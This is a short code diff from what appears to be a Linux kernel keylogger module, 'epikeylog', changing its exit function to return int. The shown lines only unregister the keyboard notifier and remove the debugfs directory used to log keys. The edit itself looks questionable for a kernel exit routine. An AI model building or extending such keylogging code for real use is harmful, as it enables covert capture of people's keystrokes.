@@ -213,7 +213,8 @@ int epikeylog_init(int keylog_mode){
  * Unregisters the module from the kernel
  * Cleans up the debugfs directory to log keys
  */
-void epikeylog_exit(void){
+int epikeylog_exit(void){
 	unregister_keyboard_notifier(&epikeylog_blk);
 	debugfs_remove_recursive(subdir);
+	return 0;
 }
